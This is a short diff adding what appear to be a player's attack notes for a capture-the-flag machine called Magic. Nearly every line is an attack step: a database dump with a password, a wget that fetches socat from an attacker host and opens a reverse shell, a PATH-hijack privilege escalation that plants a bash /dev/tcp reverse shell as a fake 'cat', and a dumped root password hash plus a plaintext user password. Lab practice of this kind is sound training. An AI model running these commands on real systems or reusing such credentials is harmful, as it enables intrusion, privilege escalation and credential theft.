@@ -1,0 +1,17 @@
+mysqldump -u theseus -p iamkingtheseus --all-databases
+wget -q http://10.10.14.21/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.21:12345
+
+socat file:`tty`,raw,echo=0 tcp-listen:12345
+netstat -tulpn | grep LISTEN
+ssh -L 631:127.0.0.1:631 -i Magic theseus@10.10.10.185 rabbit.
+
+cd /tmp/
+echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.X.X/9000 0>&1"' > cat
+chmod +x cat
+export PATH = /tmp/:$PATH
+run again /bin/sysinfo 
+
+rooted.
+
+root:$6$P9JXkqrh$tQfL.bHaQQmi7tBxwKp2wdSTB0D19Q.PHM.8tdLanqBEs70cKzul4SEY0PqfbxVkUv7bR5wrKYXJlb0p69c42.:18184:0:99999:7:::
+theseus:Th3s3usW4sK1ng
